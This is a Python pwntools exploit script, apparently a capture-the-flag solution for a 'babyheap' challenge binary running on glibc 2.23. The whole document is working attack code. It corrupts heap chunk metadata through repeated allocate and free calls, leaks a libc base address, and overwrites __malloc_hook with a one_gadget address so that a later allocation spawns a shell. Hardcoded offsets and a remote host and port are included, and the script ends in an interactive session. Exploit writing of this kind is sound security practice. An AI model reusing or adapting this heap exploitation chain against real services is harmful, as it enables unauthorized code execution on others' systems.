#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

e = ELF("./babyheap")
libc = ELF("./libc6_2.23-0ubuntu10_amd64.so")
context.binary = e
context.log_level = 'debug'

if "--tmux" in sys.argv:
	context.terminal = ['tmux','new-window']
else:
	context.terminal = ['terminator','-e']

if "--remote" in sys.argv:
	r = remote("35.186.153.116",7001)
else:
	r = process([e.path], env={"LD_PRELOAD": libc.path})


def create(size, data):
  r.sendlineafter('>', str(1))
  r.sendlineafter('size: ',str(size))
  r.sendlineafter('data: ',data)

def delete(idx):
  r.sendlineafter('>',str(2))
  r.sendlineafter('idx: ',str(idx))

def printData(idx):
  r.sendlineafter('>',str(3))
  r.sendlineafter('idx: ',str(idx))
  r.recvuntil('data: ')
  ret = r.recvuntil('\n')
  return ret[:-1]

libc_offset = 0x3c4b78
hook_offset = 0x3c4aed
onegadget_offset = 0xf02a4

create(0xf8,'A'*0xf8) 
create(0x68,'B'*0x68) 
create(0xf8,'C'*0xf8) 
create(0x10,'D'*0x10) 

delete(0)
delete(1)
create(0x68,'B'*0x68) 

for i in range(0x66,0x5f,-1):
  delete(0)
  create(i+2,'B'*i+'\x70\x01')

delete(2)

create(0xf6,'E'*0xf6) 

printData(0)

libc_leak = printData(0)
libc_leak = unpack(libc_leak + (8-len(libc_leak))*b'\x00', 64)
libc_base = libc_leak - libc_offset
log.info('LIBC BASE: '+hex(libc_leak))

for i in range(0xfd,0xf7,-1):
  delete(1)
  create(i+1,'E'*i+'\x70') 

delete(0)
delete(1)

hook = libc_base + hook_offset
create(0x108,b'F'*0x100 + p64(hook)) 

for i in range(0xfe,0xf7,-1):
  delete(0)
  create(i+8,b'F'*i+p64(0x70)) 

create(0x68,'B'*0x68)

onegadget = libc_base + onegadget_offset
create(0x68,b'G'*0x13+p64(onegadget)+b'\x00'*0x4d)
create(0x20,'A')

r.interactive()
